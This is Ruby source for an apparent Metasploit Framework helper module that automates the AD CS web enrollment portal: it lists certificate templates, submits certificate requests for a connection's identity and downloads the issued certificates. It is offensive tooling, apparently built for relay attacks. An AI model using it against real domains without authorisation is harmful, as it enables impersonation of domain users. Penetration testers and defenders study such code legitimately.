
require 'rex/proto/x509/request'

module Msf
  class Exploit
    class Remote
      module HTTP
        # This module provides a way of interacting with the Microsoft AD/CS web enrollment portal
        module WebEnrollment

          include Msf::Exploit::Remote::CertRequest
          include Msf::Exploit::Remote::LDAP::ActiveDirectory::AdCsOpts

          def get_cert_templates(http_client)
            print_status('Retrieving available template list, this may take a few minutes')
            res = send_request_raw(
              {
                'client' => http_client,
                'method' => 'GET',
                'uri' => normalize_uri(target_uri, 'certrqxt.asp')
              }
            )
            return nil unless res&.code == 200

            cert_templates = res.body.scan(/^.*Option Value="[E|O];(.*?);/).map(&:first)
            print_bad('Found no available certificate templates') if cert_templates.empty?
            cert_templates
          end

          def add_cert_entry(connection_identity, cert_template)
            if @issued_certs.key?(connection_identity)
              @issued_certs[connection_identity] << cert_template
            else
              @issued_certs[connection_identity] = [ cert_template ]
            end
          end

          def retrieve_certs(http_client, connection_identity, cert_templates)
            cert_templates.each do |cert_template|
              if cert_issued?(connection_identity, cert_template)
                print_status("Certificate already created for #{connection_identity} using #{cert_template}, skipping...")
                next
              end

              retrieve_cert(http_client, connection_identity, cert_template)
            end
          end

          def cert_issued?(connection_identity, cert_template)
            !!@issued_certs[connection_identity]&.include?(cert_template)
          end

          def retrieve_cert(http_client, connection_identity, cert_template)
            opts = {
              username: connection_identity.split('\\').last,
              domain: connection_identity.split('\\').first,  # this is slightly inconsistent since it's the NETBIOS domain name not FQDN
              cert_template: cert_template,
            }

            with_adcs_certificate_request(opts) do |csr, attributes|
              if (certificate = do_request_cert(http_client, opts, csr, attributes))
                # Unlike with MS-ICPR we're not confident the target is the AD CS service we think it is until a
                # certificate is issued so wait and only report the service if it worked
                opts[:service] = report_web_enrollment_service
              end

              certificate
            end
          end

          def do_request_cert(http_client, opts, csr, attributes)
            res = send_request_raw(
              {
                'client' => http_client,
                'method' => 'POST',
                'uri' => normalize_uri(datastore['TARGETURI'], 'certfnsh.asp'),
                'ctype' => 'application/x-www-form-urlencoded',
                'vars_post' => {
                  'Mode' => 'newreq',
                  'CertRequest' => Rex::Text.encode_base64(csr.to_der.to_s),
                  'CertAttrib' => attributes.map { |k, v| "#{k}:#{v}" }.join("\n"),
                  'TargetStoreFlags' => 0,
                  'SaveCert' => 'yes',
                  'ThumbPrint' => ''
                },
                'cgi' => true
              }
            )

            cert_template = opts[:cert_template]
            connection_identity = "#{opts[:domain]}\\#{opts[:username]}"

            if res.nil?
              print_bad('Certificate request failed, no response was received from the server')
              return nil
            end

            if res.code == 200 && res.body.include?('request was denied')
              print_bad("Certificate request denied using template #{cert_template} for #{connection_identity}")
              return nil
            end

            if res.code == 200 && res.body.include?('request failed')
              print_bad("Certificate request failed using template #{cert_template} for #{connection_identity}")
              return nil
            end
            if res.code == 401 && res.body.include?('invalid credentials')
              print_bad("Invalid Credential Error returned when using template #{cert_template} for #{connection_identity}")
              return nil
            end
            print_good("Certificate generated using template #{cert_template} for #{connection_identity}")
            add_cert_entry(connection_identity, cert_template)

            begin
              location_tag = res.body.match(/^.*location="(.*)"/)[1]
            rescue NoMethodError
              print_bad('Unable to locate location tag')
              return nil
            end

            location_uri = normalize_uri(target_uri, location_tag)
            vprint_status("Attempting to download the certificate from #{location_uri}")
            res = send_request_raw(
              {
                'client' => http_client,
                'method' => 'GET',
                'uri' => location_uri
              }
            )
            OpenSSL::X509::Certificate.new(res.body)
          end

          def report_web_enrollment_service
            common = { host: rhost, port: rport, proto: 'tcp' }
            report_service({
              name: 'AD CS Web Enrollment',
              parents: {
                name: ssl ? 'https' : 'http',
                parents: {
                  name: 'tcp'
                }.merge(common)
              }.merge(common)
            }.merge(common))
          end
        end
      end
    end
  end
end
